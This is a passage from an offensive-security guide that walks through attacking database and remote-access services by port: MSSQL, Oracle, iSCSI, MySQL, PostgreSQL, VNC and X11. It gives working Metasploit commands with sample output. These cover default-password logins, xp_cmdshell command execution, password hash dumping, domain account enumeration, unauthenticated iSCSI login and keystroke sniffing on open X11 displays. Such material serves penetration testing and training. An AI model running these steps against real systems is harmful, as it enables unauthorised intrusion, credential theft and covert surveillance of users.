   auxiliary/admin/mssql/mssql_escalate_execute_as                            normal     Microsoft SQL Server Escalate EXECUTE AS
   auxiliary/admin/mssql/mssql_escalate_execute_as_sqli                       normal     Microsoft SQL Server SQLi Escalate Execute AS
   auxiliary/admin/mssql/mssql_exec                                           normal     Microsoft SQL Server xp_cmdshell Command Execution
   auxiliary/admin/mssql/mssql_findandsampledata                              normal     Microsoft SQL Server Find and Sample Data
   auxiliary/admin/mssql/mssql_idf                                            normal     Microsoft SQL Server Interesting Data Finder
   auxiliary/admin/mssql/mssql_ntlm_stealer                                   normal     Microsoft SQL Server NTLM Stealer
   auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                              normal     Microsoft SQL Server SQLi NTLM Stealer
   auxiliary/admin/mssql/mssql_sql                                            normal     Microsoft SQL Server Generic Query
   auxiliary/admin/mssql/mssql_sql_file                                       normal     Microsoft SQL Server Generic Query from File
   auxiliary/analyze/jtr_mssql_fast                                           normal     John the Ripper MS SQL Password Cracker (Fast Mode)
   auxiliary/gather/lansweeper_collector                                      normal     Lansweeper Credential Collector
   auxiliary/scanner/mssql/mssql_hashdump                                     normal     MSSQL Password Hashdump
   auxiliary/scanner/mssql/mssql_login                                        normal     MSSQL Login Utility
   auxiliary/scanner/mssql/mssql_ping                                         normal     MSSQL Ping Utility
   auxiliary/scanner/mssql/mssql_schemadump                                   normal     MSSQL Schema Dump
```

Let's take 
<ol>
<li>
<strong>MSSQL Ping Utility</strong> which queries the MSSQL instance for information. This will also provide if any ms-sql is running on different ports. 
```
use auxiliary/scanner/mssql/mssql_ping
services -p 1433 -R
```
Sample output:
```
[*] SQL Server information for 10.10.xx.xx:
[+]    ServerName      = SAPBWBI
[+]    InstanceName    = BOE140
[+]    IsClustered     = No
[+]    Version         = 10.0.xx.xx
[+]    tcp             = 50623
[+]    np              = \\SAPBWBI\pipe\MSSQL$BOE140\sql\query
[*] SQL Server information for 10.10.xx.xx:
[+]    ServerName      = MANGOOSE
[+]    InstanceName    = MSSQLSERVER
[+]    IsClustered     = No
[+]    Version         = 11.0.xx.xx
[+]    tcp             = 1433
[*] SQL Server information for 10.10.xx.xx:
[+]    ServerName      = MHE-DMP
[+]    InstanceName    = MSSQLSERVER
[+]    IsClustered     = No
[+]    Version         = 11.0.xx.xx
[+]    tcp             = 1433
[*] SQL Server information for 10.10.xx.xx:
[+]    ServerName      = MHE-DMP
[+]    InstanceName    = MHE_DMP_LIVE
[+]    IsClustered     = No
[+]    Version         = 11.0.xx.xx
[+]    tcp             = 53029
```
After discovering the ms-sql instances, we can check if their are any default passwords. 
</li>
<li>Let's use <strong>MSSQL Login Utility</strong> to find out if we have any default passwords. This module simply queries the MSSQL instance for a specific user/pass (default is sa with blank) we always find default passwords such as company@123 etc. Once in an engagement, out of 200 Ms-sql instance we found around 60 default passwords. ;)
```
use auxiliary/scanner/mssql/mssql_login
set Password company@123
services -p 1433 -R
```
Sample Output:
```
[*] 10.10.xx.xx:1433 - MSSQL - Starting authentication scanner.
[+] 10.10.xx.xx:1433 - LOGIN SUCCESSFUL: WORKSTATION\sa:company@123
[-] 10.10.xx.xx:1433 MSSQL - LOGIN FAILED: WORKSTATION\sa:company@123 (Incorrect: )
```

Once, we have the credentials to the SQL Server we can use Microsoft SQL Server Configuration Enumerator by "Carlos Perez" 

```
use auxiliary/admin/mssql/mssql_enum
set rhost 10.10.xx.xx
set password company@123
```
Sample Output:
```
[*] Running MS SQL Server Enumeration...
[*] Version:
[*]	Microsoft SQL Server 2012 - 11.0.xx.xx (X64) 
[*]		Feb 10 2012 19:39:15 
[*]		Copyright (c) Microsoft Corporation
[*]		Enterprise Edition (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1)
[*] Configuration Parameters:
[*] 	C2 Audit Mode is Not Enabled
[*] 	xp_cmdshell is Enabled
[*] 	remote access is Enabled
[*] 	allow updates is Not Enabled
[*] 	Database Mail XPs is Not Enabled
[*] 	Ole Automation Procedures are Not Enabled
[*] Databases on the server:
[*] 	Database name:master
[*] 	Database Files for master:
[*] 		C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\master.mdf
[*] 		C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\mastlog.ldf
[*] 	Database name:tempdb
[*] 	Database Files for tempdb:
[*] 		D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\tempdb.mdf
[*] 		D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\templog.ldf
[*] 	Database name:model
[*] 	Database Files for model:
[*] 		C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\model.mdf
[*] 		C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\modellog.ldf
[*] 	Database name:msdb
[*] 	Database Files for msdb:
[*] 		C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\MSDBData.mdf
[*] 		C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\MSDBLog.ldf
[*] 	Database name:ReportServer
[*] 	Database Files for ReportServer:
[*] 		D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\ReportServer.mdf
[*] 		D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\ReportServer_log.ldf
[*] 	Database name:ReportServerTempDB
[*] 	Database Files for ReportServerTempDB:
[*] 		D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\ReportServerTempDB.mdf
[*] 		D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\ReportServerTempDB_log.ldf
[*] System Logins on this Server:
[*] 	sa
[*] 	##MS_SQLResourceSigningCertificate##
[*] 	##MS_SQLReplicationSigningCertificate##
[*] 	##MS_SQLAuthenticatorCertificate##
[*] 	##MS_PolicySigningCertificate##
[*] 	##MS_SmoExtendedSigningCertificate##
[*] 	##MS_PolicyEventProcessingLogin##
[*] 	##MS_PolicyTsqlExecutionLogin##
[*] 	##MS_AgentSigningCertificate##
[*] 	EXAMPLE\Administrator
[*] 	OTH-EXAMPLE\altadmin
[*] 	NT SERVICE\SQLWriter
[*] 	NT SERVICE\Winmgmt
[*] 	NT Service\MSSQLSERVER
[*] 	NT AUTHORITY\SYSTEM
[*] 	NT SERVICE\SQLSERVERAGENT
[*] 	NT SERVICE\ReportServer
[*] Disabled Accounts:
[*] 	##MS_PolicyEventProcessingLogin##
[*] 	##MS_PolicyTsqlExecutionLogin##
[*] No Accounts Policy is set for:
[*] 	All System Accounts have the Windows Account Policy Applied to them.
[*] Password Expiration is not checked for:
[*] 	sa
[*] 	##MS_PolicyEventProcessingLogin##
[*] 	##MS_PolicyTsqlExecutionLogin##
[*] System Admin Logins on this Server:
[*] 	sa
[*] 	EXAMPLE\Administrator
[*] 	OTH-EXAMPLE\altadmin
[*] 	NT SERVICE\SQLWriter
[*] 	NT SERVICE\Winmgmt
[*] 	NT Service\MSSQLSERVER
[*] 	NT SERVICE\SQLSERVERAGENT
[*] Windows Logins on this Server:
[*] 	EXAMPLE\Administrator
[*] 	OTH-EXAMPLE\altadmin
[*] 	NT SERVICE\SQLWriter
[*] 	NT SERVICE\Winmgmt
[*] 	NT Service\MSSQLSERVER
[*] 	NT AUTHORITY\SYSTEM
[*] 	NT SERVICE\SQLSERVERAGENT
[*] 	NT SERVICE\ReportServer
[*] Windows Groups that can logins on this Server:
[*] 	No Windows Groups where found with permission to login to system.
[*] Accounts with Username and Password being the same:
[*] 	No Account with its password being the same as its username was found.
[*] Accounts with empty password:
[*] 	No Accounts with empty passwords where found.
[*] Stored Procedures with Public Execute Permission found:
[*] 	sp_replsetsyncstatus
[*] 	sp_replcounters
[*] 	sp_replsendtoqueue
[*] 	sp_resyncexecutesql
[*] 	sp_prepexecrpc
[*] 	sp_repltrans
[*] 	sp_xml_preparedocument
[*] 	xp_qv
[*] 	xp_getnetname
[*] 	sp_releaseschemalock
[*] 	sp_refreshview
[*] 	sp_replcmds
[*] 	sp_unprepare
[*] 	sp_resyncprepare
[*] 	sp_createorphan
[*] 	xp_dirtree
[*] 	sp_replwritetovarbin
[*] 	sp_replsetoriginator
[*] 	sp_xml_removedocument
[*] 	sp_repldone
[*] 	sp_reset_connection
[*] 	xp_fileexist
[*] 	xp_fixeddrives
[*] 	sp_getschemalock
[*] 	sp_prepexec
[*] 	xp_revokelogin
[*] 	sp_resyncuniquetable
[*] 	sp_replflush
[*] 	sp_resyncexecute
[*] 	xp_grantlogin
[*] 	sp_droporphans
[*] 	xp_regread
[*] 	sp_getbindtoken
[*] 	sp_replincrementlsn
[*] Instances found on this server:
[*] 	MSSQLSERVER
[*] 	SQLEXPRESS
[*] Default Server Instance SQL Server Service is running under the privilege of:
[*] 	NT Service\MSSQLSERVER
[*] Instance SQLEXPRESS SQL Server Service is running under the privilege of:
[*] 	NT AUTHORITY\NETWORKSERVICE
[*] Auxiliary module execution completed
```
</li>
<li>
Next, we can execute command using <strong>Microsoft SQL Server xp_cmdshell Command Execution</strong> if xp_cmdshell is enabled and if the user has permissions.

```
use auxiliary/admin/mssql/mssql_exec
set RHOst 10.10.xx.xx
set password company@123
set cmd ipconfig
```
Sample Output:
```
Windows IP Configuration
 
 
 Ethernet adapter LAN:
 
    Connection-specific DNS Suffix  . : 
    IPv4 Address. . . . . . . . . . . : 10.10.xx.xx
    Subnet Mask . . . . . . . . . . . : 255.255.xx.xx
    Default Gateway . . . . . . . . . : 10.10.xx.xx
 
 Ethernet adapter Local Area Connection 3:
 
    Connection-specific DNS Suffix  . : 
    Link-local IPv6 Address . . . . . : fe80::798f:6cad:4f1e:c5fb%15
    Autoconfiguration IPv4 Address. . : 169.254.xx.xx
    Subnet Mask . . . . . . . . . . . : 255.255.xx.xx
    Default Gateway . . . . . . . . . : 
 
 Tunnel adapter isatap.{D295B095-19EB-436E-97D0-4D22486521CC}:
 
    Media State . . . . . . . . . . . : Media disconnected
    Connection-specific DNS Suffix  . : 
 
 Tunnel adapter isatap.{A738E25A-F5E3-4E36-8F96-6977E22136B6}:
 
    Media State . . . . . . . . . . . : Media disconnected
    Connection-specific DNS Suffix  . : 
```
</li>
</ol>

Scott Sutherland has written four parts of <strong>Hacking SQL Servers</strong>:  ( A must-read )
<ol>
<li>
<a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/">Hacking SQL Server Stored Procedures – Part 1: (un)Trustworthy Databases</a> : how database users commonly created for web applications can be used to escalate privileges in SQL Server when database ownership is poorly configured. Corresponding Metasploit module is Microsoft SQL Server Escalate Db_Owner 'mssql_escalate_dbowner'.
</li>
<li><a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/">Hacking SQL Server Stored Procedures – Part 2: User Impersonation</a>   : provides a lab guide and attack walk-through that can be used to gain a better understanding of how the IMPERSONATE privilege can lead to privilege escalation in SQL Server. Corresponding Metasploit module is Microsoft SQL Server Escalate EXECUTE AS 'mssql_escalate_execute_as'.
</li>
<li><a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/">Hacking SQL Server Stored Procedures – Part 3: SQL Injection</a>   : This blog covers how SQL injection can be identified and exploited to escalate privileges in SQL Server stored procedures when they are configured to execute with higher privileges using the WITH EXECUTE AS clause or certificate signing.
</li>
<li><a href="https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/">Hacking SQL Server Procedures – Part 4: Enumerating Domain Accounts</a> : shows enumerate Active Directory domain users, groups, and computers through native SQL Server functions using logins that only have the Public server role (everyone). I’ll also show how to enumerate SQL Server logins using a similar technique. Corresponding module is <strong>Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration</strong>
```
use auxiliary/admin/mssql/mssql_enum_domain_accounts
set rhost 10.10.xx.xx
set password company@123
```
Sample Output:
```
[*] Attempting to connect to the database server at 10.10.xx.xx:1433 as sa...
[+] Connected.
[*] SQL Server Name: EXAMPLECRM1
[*] Domain Name: EXAMPLE
[+] Found the domain sid: 01050000000000051500000016c0ea32f450ba7443170a32
[*] Brute forcing 10000 RIDs through the SQL Server, be patient...
[*]  - EXAMPLE\administrator
[*]  - EXAMPLE\Guest
[*]  - EXAMPLE\krbtgt
[*]  - EXAMPLE\Domain Admins
[*]  - EXAMPLE\Domain Users
[*]  - EXAMPLE\Domain Guests
[*]  - EXAMPLE\Domain Computers
[*]  - EXAMPLE\Domain Controllers
[*]  - EXAMPLE\Cert Publishers
[*]  - EXAMPLE\Schema Admins
[*]  - EXAMPLE\Enterprise Admins
[*]  - EXAMPLE\Group Policy Creator Owners
[*]  - EXAMPLE\Read-only Domain Controllers
[*]  - EXAMPLE\RAS and IAS Servers
[*]  - EXAMPLE\Allowed RODC Password Replication Group
[*]  - EXAMPLE\Denied RODC Password Replication Group
[*]  - EXAMPLE\TsInternetUser
```</li>
</ol>


Other fun modules to check are
<ol>
<li> <strong>Microsoft SQL Server Find and Sample Data</strong>: This script will search through all of the non-default databases on the SQL Server for columns that match the keywords defined in the TSQL KEYWORDS option. If column names are found that match the defined keywords and data is present in the associated tables, the script will select a sample of the records from each of the affected tables. The sample size is determined by the SAMPLE_SIZE option, and results output in a CSV format.
```
use auxiliary/admin/mssql/mssql_findandsampledata 
```
</li>
<li>
<strong>Microsoft SQL Server Generic Query</strong>: This module will allow for simple SQL statements to be executed against a MSSQL/MSDE instance given the appropiate credentials.
```
use auxiliary/admin/mssql/mssql_sql
```
</li>
<li><strong>MSSQL Schema Dump</strong>: This module attempts to extract the schema from a MSSQL Server Instance. It will disregard builtin and example DBs such as master,model,msdb, and tempdb. The module will create a note for each DB found, and store a YAML formatted output as loot for easy reading.
```
use auxiliary/scanner/mssql/mssql_schemadump
```
</li>
</ol>

We can also use 
<ol>
<li>
<strong>tsql command</strong>, install it by using freetds-bin package and use it like
```
tsql -H 10.10.xx.xx -p 1433 -U sa -P company@123
locale is "en_IN"
locale charset is "UTF-8"
using default charset "UTF-8"
1> SELECT suser_sname(owner_sid)
2> FROM sys.databases
3> go

sa
sa
sa
sa
EXAMPLE\administrator
EXAMPLE\administrator
EXAMPLE\kuanxxxx
(7 rows affected)
```
See examples for Scott blogs, how to execute queries.
</li>
<li>We can also use <strong>Microsoft SQL Server Management</strong> to connect to Remote Database.</li>
</ol>




###Oracle | Port 1521

After setting up oracle with metasploit here <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux">How to get Oracle Support working with Kali Linux</a>  

<strong>Metasploit</strong> has

<ol>
<li>we can use <strong>Oracle TNS Listener Service Version Query</strong>
```
use auxiliary/scanner/oracle/tnslsnr_version 
services -p 1521 -u -R
```
Sample Output:
```
[+] 10.10.xx.xx:1521 Oracle - Version: 64-bit Windows: Version 11.1.0.7.0 - Production
[-] 10.10.xx.xx:1521 Oracle - Version: Unknown - Error code 1189 - The listener could not authenticate the user
[-] 10.10.xx.xx:1521 Oracle - Version: Unknown
[*] Scanned  8 of 12 hosts (66% complete)
[+] 10.10.xx.xx:1521 Oracle - Version: 32-bit Windows: Version 10.2.0.1.0 - Production
```
</li>

<li>
We can use <strong>Oracle TNS Listener Checker</strong> which module checks the server for vulnerabilities like TNS Poison.
```
use auxiliary/scanner/oracle/tnspoison_checker
services -p 1521 -u -R
```
Sample Output:
```
[+] 10.10.xx.xx:1521 is vulnerable
[+] 10.10.xx.xx:1521 is vulnerable
[*] Scanned  2 of 12 hosts (16% complete)
[-] 10.10.xx.xx:1521 is not vulnerable 
```
</li>

<li>
We can also use <strong>Oracle TNS Listener SID Bruteforce</strong> which queries the TNS listner for a valid Oracle database instance name (also known as a SID). Oracle TNS Listener SID Enumeration can only be used if the oracle version is less than Oracle 9.2.xx.xx.
```
use auxiliary/scanner/oracle/sid_brute
services -p 1521 -u -R
```
Sample Output:
```
[+] 10.10.xx.xx:1521 Oracle - 'CLREXTPROC' is valid
[*] 10.10.xx.xx:1521  - Oracle - Refused 'CLREXTPROC'
[+] 10.10.xx.xx:1521 Oracle - 'CLREXTPROC' is valid
```	
</li>

### ISCSI | Port 3260

Internet Small Computer Systems Interface, an Internet Protocol (IP)-based storage networking standard for linking data storage facilities. A good article is <a href="https://pig.made-it.com/iSCSI.html">SCSI over IP</a>
<br>
<br>
<strong>Nmap</strong> has

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/iscsi-info.html">iscsi-info.nse</a>: Collects and displays information from remote iSCSI targets.

Sample Output:
```
nmap -sV -p 3260 192.168.xx.xx --script=iscsi-info

Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-04 14:50 IST
Nmap scan report for 192.168.xx.xx
Host is up (0.00064s latency).
PORT     STATE SERVICE VERSION
3260/tcp open  iscsi?
| iscsi-info: 
|   iqn.1992-05.com.emc:fl1001433000190000-3-vnxe: 
|     Address: 192.168.xx.xx:3260,1
|_    Authentication: NOT required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 138.09 seconds
```
</li>
</ol>

Hacking Team DIY shows to run

<ol>
<li> We can discover the target IP address by using the below command
```
iscsiadm -m discovery -t sendtargets -p 192.168.xx.xx
192.168.xx.xx:3260,1 iqn.1992-05.com.emc:fl1001433000190000-3-vnxe
```
</li>
<li> Login via
```
iscsiadm -m node --targetname="iqn.1992-05.com.emc:fl1001433000190000-3-vnxe" -l -p 192.168.xx.xx --login -
Logging in to [iface: default, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 192.168.xx.xx,3260] (multiple)
Login to [iface: default, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 192.168.xx.xx,3260] successful.
```</li>

<li> When we login, ideally we should be able to see the location, however for some strange reason we didn't got that here.
```
[43852.014179] scsi host6: iSCSI Initiator over TCP/IP
[43852.306055] scsi 6:0:0:0: Direct-Access     EMC      Celerra          0002 PQ: 1 ANSI: 5
[43852.323940] scsi 6:0:0:0: Attached scsi generic sg1 type 0
```</li>
<li>We can logout using --logout
```
iscsiadm -m node --targetname="iqn.1992-05.com.emc:fl1001433000190000-3-vnxe" -p 192.168.xx.xx --logout
Logging out of session [sid: 6, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 192.168.xx.xx,3260]
Logout of [sid: 6, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 192.168.xx.xx,3260] successful.
```</li>
<li>We can find more information about it by just using without any --login/--logout parameter
```
iscsiadm -m node --targetname="iqn.1992-05.com.emc:fl1001433000190000-3-vnxe" -p 192.168.xx.xx
# BEGIN RECORD 2.0-873
node.name = iqn.1992-05.com.emc:fl1001433000190000-3-vnxe
node.tpgt = 1
node.startup = manual
node.leading_login = No
iface.hwaddress = <empty>
iface.ipaddress = <empty>
iface.iscsi_ifacename = default
iface.net_ifacename = <empty>
iface.transport_name = tcp
iface.initiatorname = <empty>
iface.bootproto = <empty>
iface.subnet_mask = <empty>
iface.gateway = <empty>
iface.ipv6_autocfg = <empty>
iface.linklocal_autocfg = <empty>
iface.router_autocfg = <empty>
iface.ipv6_linklocal = <empty>
iface.ipv6_router = <empty>
iface.state = <empty>
iface.vlan_id = 0
iface.vlan_priority = 0
iface.vlan_state = <empty>
iface.iface_num = 0
iface.mtu = 0
iface.port = 0
node.discovery_address = 192.168.xx.xx
node.discovery_port = 3260
node.discovery_type = send_targets
node.session.initial_cmdsn = 0
node.session.initial_login_retry_max = 8
node.session.xmit_thread_priority = -20
node.session.cmds_max = 128
node.session.queue_depth = 32
node.session.nr_sessions = 1
node.session.auth.authmethod = None
node.session.auth.username = <empty>
node.session.auth.password = <empty>
node.session.auth.username_in = <empty>
node.session.auth.password_in = <empty>
node.session.timeo.replacement_timeout = 120
node.session.err_timeo.abort_timeout = 15
node.session.err_timeo.lu_reset_timeout = 30
node.session.err_timeo.tgt_reset_timeout = 30
node.session.err_timeo.host_reset_timeout = 60
node.session.iscsi.FastAbort = Yes
node.session.iscsi.InitialR2T = No
node.session.iscsi.ImmediateData = Yes
node.session.iscsi.FirstBurstLength = 262144
node.session.iscsi.MaxBurstLength = 16776192
node.session.iscsi.DefaultTime2Retain = 0
node.session.iscsi.DefaultTime2Wait = 2
node.session.iscsi.MaxConnections = 1
node.session.iscsi.MaxOutstandingR2T = 1
node.session.iscsi.ERL = 0
node.conn[0].address = 192.168.xx.xx
node.conn[0].port = 3260
node.conn[0].startup = manual
node.conn[0].tcp.window_size = 524288
node.conn[0].tcp.type_of_service = 0
node.conn[0].timeo.logout_timeout = 15
node.conn[0].timeo.login_timeout = 15
node.conn[0].timeo.auth_timeout = 45
node.conn[0].timeo.noop_out_interval = 5
node.conn[0].timeo.noop_out_timeout = 5
node.conn[0].iscsi.MaxXmitDataSegmentLength = 0
node.conn[0].iscsi.MaxRecvDataSegmentLength = 262144
node.conn[0].iscsi.HeaderDigest = None
node.conn[0].iscsi.DataDigest = None
node.conn[0].iscsi.IFMarker = No
node.conn[0].iscsi.OFMarker = No
# END RECORD

```</li>
</ol>


###MySQL | Port 3306

<strong>Metasploit</strong> has 

<ol>
<li><strong>MySQL Server Version Enumeration</strong> : Enumerates the version of MySQL servers
```
use auxiliary/scanner/mysql/mysql_version
services -p 3306 -u -R
```
Sample Output:
```
[*] 10.7.xx.xx:3306 is running MySQL, but responds with an error: \x04Host '10.10.3.71' is not allowed to connect to this MySQL server
[*] 10.10.xx.xx:3306 is running MySQL 5.5.47-0ubuntu0.14.04.1-log (protocol 10)
[*] 10.10.xx.xx:3306 is running MySQL 5.5.47-0ubuntu0.14.04.1-log (protocol 10)
[*] Scanned  5 of 44 hosts (11% complete)
[*] 10.10.xx.xx:3306 is running MySQL 5.1.52 (protocol 10)
[*] 10.10.xx.xx:3306 is running MySQL 5.1.52 (protocol 10)
[*] 10.10.xx.xx:3306 is running MySQL 5.5.35-0ubuntu0.12.04.2 (protocol 10)
[*] 10.10.xx.xx:3306 is running MySQL 5.0.95 (protocol 10)
[*] Scanned  9 of 44 hosts (20% complete)
[*] 10.10.xx.xx:3306 is running MySQL 5.0.22 (protocol 10)
[*] 10.10.xx.xx:3306 is running MySQL, but responds with an error: \x04Host '10.10.3.71' is not allowed to connect to this MySQL server
[*] 10.10.xx.xx:3306 is running MySQL, but responds with an error: \x04Host '10.10.3.71' is not allowed to connect to this MariaDB server
[*] 10.10.xx.xx:3306 is running MySQL 5.0.22 (protocol 10)
[*] 10.10.xx.xx:3306 is running MySQL, but responds with an error: \x04Host '10.10.3.71' is not allowed to connect to this MySQL server
[*] Scanned 14 of 44 hosts (31% complete)
[*] 10.10.xx.xx:3306 is running MySQL, but responds with an error: \x04Host '10.10.3.71' is not allowed to connect to this MySQL server
[*] 10.10.xx.xx:3306 is running MySQL 5.0.22 (protocol 10)
[*] 10.10.xx.xx:3306 is running MySQL, but responds with an error: \x04Host '10.10.3.71' is not allowed to connect to this MySQL server
[*] 10.10.xx.xx:3306 is running MySQL 5.1.52 (protocol 10)
[*] Scanned 18 of 44 hosts (40% complete)
[*] 10.10.xx.xx:3306 is running MySQL 3.23.41 (protocol 10)
[*] 10.10.xx.xx:3306 is running MySQL 3.23.41 (protocol 10)
[*] 10.10.xx.xx:3306 is running MySQL 5.6.17 (protocol 10)
[*] 10.10.xx.xx:3306 is running MySQL 5.1.50-community (protocol 10)
```
</li>
<li><strong>MySQL Login Utility</strong> to validate login or bruteforce logins. This module simply queries the MySQL instance for a specific user/pass (default is root with blank)

```
use auxiliary/scanner/mysql/mysql_login
services -p 3306 -u -R
set username root
set password example@123
```
Sample Output:
```
[*] 10.10.xx.xx:3306 MYSQL - Found remote MySQL version 5.1.50
[+] 10.10.xx.xx:3306 MYSQL - Success: 'root:example@123'
[*] Scanned 22 of 44 hosts (50% complete)
[*] 10.10.xx.xx:3306 MYSQL - Found remote MySQL version 5.1.50
[+] 10.10.xx.xx:3306 MYSQL - Success: 'root:example@123'
[-] 10.10.xx.xx:3306 MYSQL - Unsupported target version of MySQL detected. Skipping.
[-] 10.10.xx.xx:3306 MYSQL - Unsupported target version of MySQL detected. Skipping.
[*] 10.10.xx.xx:3306 MYSQL - Found remote MySQL version 5.6.15
[-] 10.10.xx.xx:3306 MYSQL - LOGIN FAILED: root:example@123 (Incorrect: 
```
</li>
<li>Once we have to username passsword for the root we can use <strong>MYSQL Password Hashdump</strong> to extract the usernames and encrypted password hashes from a MySQL server.
```
use auxiliary/scanner/mysql/mysql_hashdump
creds -p 3306 -t password -u root -R
set username root
set password example@123
```
Sample Output:
```
[-] MySQL Error: RbMysql::HandshakeError Bad handshake
[-] There was an error reading the MySQL User Table
[*] Scanned 4 of 6 hosts (66% complete)
[+] Saving HashString as Loot: root:*6FE073B02F77230C092415032F0FF0951FXXXXXX
[+] Saving HashString as Loot: wordpress:*A31B8F449706C32558ABC788DDABF62DCCXXXXXX
[+] Saving HashString as Loot: root:*6FE073B02F77230C092415032F0FF0951FXXXXXX
[*] Scanned 5 of 6 hosts (83% complete)
[+] Saving HashString as Loot: newsgroupdbo:*6FE073B02F77230C092415032F0FF0951FXXXXXX
[+] Saving HashString as Loot: intiadda:*6FE073B02F77230C092415032F0FF0951XXXXXX
[+] Saving HashString as Loot: newsgroupdbo:*6FE073B02F77230C092415032F0FF0951FXXXXXX
```
</li>
</ol>

Once we have the username and password, we can use 
<ol>
<li><strong>mysql utility</strong> to login in to the server.
```
mysql -u root -p -h 10.10.xx.xx
```
</li>
</ol>

Explore UDF functionality and vulnerablity!!

###Postgresql | Port 5432 

<strong>Metasploit</strong> has 
<ol>
<li><strong>PostgreSQL Version Probe</strong> : Enumerates the verion of PostgreSQL servers.
```
use auxiliary/scanner/postgres/postgres_version
```
</li>
<li><strong>PostgreSQL Login Utility</strong>: This module attempts to authenticate against a PostgreSQL instance using username and password combinations indicated by the USER_FILE, 
  PASS_FILE, and USERPASS_FILE options.

```
use auxiliary/scanner/postgres/postgres_login
```</li>
<li><strong>PostgreSQL Database Name Command Line Flag Injection</strong>: identify PostgreSQL 9.0, 9.1, and 9.2 servers that are vulnerable to command-line flag injection through CVE-2013-1899. This can lead to denial of service, privilege escalation, or even arbitrary code execution
```
use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
</li>
</ol>


###VNC | Port 5900

We always find openVNCs in an engagement. 

<strong>Metasploit</strong> has 
<ol>
<li><strong>VNC Authentication None Detection</strong>: Detect VNC servers that support the "None" authentication method.
```
use auxiliary/scanner/vnc/vnc_none_auth
```
</li>
<li><strong>VNC Authentication Scanner</strong>:   This module will test a VNC server on a range of machines and report successful logins. Currently it supports RFB protocol version 3.3, 3.7, 3.8 and 4.001 using the VNC challenge response authentication method.
```
use auxiliary/scanner/vnc/vnc_login
```</li>
</ol>

###X11 | Port 6000 

We do also find a lot of open X11 servers, we can use x11 to find the keyboard strokes and screenshots.

<strong>Metasploit</strong> has 
<ol>
<li>
<strong>X11 No-Auth Scanner</strong>: This module scans for X11 servers that allow anyone to connect without authentication.
```
auxiliary/scanner/x11/open_x11
services -p 6000 -u -R
```
Sample output
```
[*] 10.9.xx.xx Access Denied
[*] 10.9.xx.xx Open X Server (The XFree86 Project, Inc)

[*] Scanned  5 of 45 hosts (11% complete)
[-] No response received due to a timeout
[*] 10.10.xx.xx Access Denied
[*] Scanned  9 of 45 hosts (20% complete)
[*] 10.11.xx.xx Access Denied
[*] Scanned 14 of 45 hosts (31% complete)
[*] 10.15.xx.xx Access Denied
[*] Scanned 18 of 45 hosts (40% complete)
[*] 10.19.xx.xx Access Denied
[*] Scanned 23 of 45 hosts (51% complete)
[*] Scanned 27 of 45 hosts (60% complete)
[*] Scanned 32 of 45 hosts (71% complete)
[*] 10.20.xx.xx Open X Server (Xfree86-Heidenhain-Project)
[*] Scanned 36 of 45 hosts (80% complete)
[*] Scanned 41 of 45 hosts (91% complete)
[*] 10.87.xx.xx Access Denied
[*] Scanned 45 of 45 hosts (100% complete)
[*] Auxiliary module execution completed
```
</li>
</ol>

We can use 
<ol>
<li><a href="http://tools.kali.org/sniffingspoofing/xspy">xspy</a> to sniff the keyboard keystrokes.

Sample Output:
```
xspy 10.9.xx.xx

opened 10.9.xx.xx:0 for snoopng
swaBackSpaceCaps_Lock josephtTabcBackSpaceShift_L workShift_L 2123
qsaminusKP_Down KP_Begin KP_Down KP_Left KP_Insert TabRightLeftRightDeletebTabDownnTabKP_End KP_Right KP_Up KP_Down KP_Up KP_Up TabmtminusdBackSpacewinTab
```
</li>

<li>We can also use x11 to grab <strong>screenshots or live videos</strong> of the user. We need to  verify the connection is open and we can get to it:
```
xdpyinfo -display <ip>:<display>
```
Sample Output:
```
xdpyinfo -display 10.20.xx.xx:0
name of display:    10.20.xx.xx:0
version number:    11.0
vendor string:    Xfree86-Heidenhain-Project
vendor release number:    0
maximum request size:  262140 bytes
motion buffer size:  0
bitmap unit, bit order, padding:    32, LSBFirst, 32
image byte order:    LSBFirst
number of supported pixmap formats:    6
supported pixmap formats:
    depth 1, bits_per_pixel 1, scanline_pad 32
    depth 4, bits_per_pixel 8, scanline_pad 32
    depth 8, bits_per_pixel 8, scanline_pad 32
    depth 15, bits_per_pixel 16, scanline_pad 32
    depth 16, bits_per_pixel 16, scanline_pad 32
    depth 24, bits_per_pixel 32, scanline_pad 32
keycode range:    minimum 8, maximum 255
focus:  window 0x600005, revert to Parent
number of extensions:    11
    FontCache
    MIT-SCREEN-SAVER
    MIT-SHM
    RECORD
    SECURITY
    SHAPE
    XC-MISC
    XFree86-DGA
    XFree86-VidModeExtension
    XInputExtension
    XVideo
